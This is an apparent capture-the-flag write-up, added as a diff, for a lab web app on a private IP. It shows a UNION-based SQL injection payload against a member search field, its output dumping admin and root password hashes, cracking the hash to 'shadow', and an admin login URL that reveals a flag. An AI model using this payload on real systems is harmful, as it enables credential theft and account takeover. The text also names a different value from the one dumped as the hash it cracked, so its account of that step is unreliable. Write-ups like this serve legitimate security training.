@@ -1,0 +1,28 @@
+
+So from Member_Sql_Injection we saw a Member_Brute_Force database with db_default table
+I concluded Member meant it was for the search Member page.
+I ran this command for seeing the content of a neighbour table inside search Member input;
+
+TESTED: 1 OR 1=1 UNION SELECT username,password FROM Member_Brute_Force.db_default 
+output:
+    First name: one
+    Surname : me
+    First name: two
+    Surname : me
+
+    First name: three
+    Surname : me
+
+    First name: Flag
+    Surname : GetThe
+    First name: root
+    Surname : 3bf1114a986ba87ed28fc1b5884fc2f8
+    First name: admin
+    Surname : 3bf1114a986ba87ed28fc1b5884fc2f8
+
+
+Went to CrackStation decode b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2 -> shadow
+
+Went to http://192.168.1.144/?page=signin&username=admin&password=shadow&Login=Login#
+Boom Flag:
+    b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2
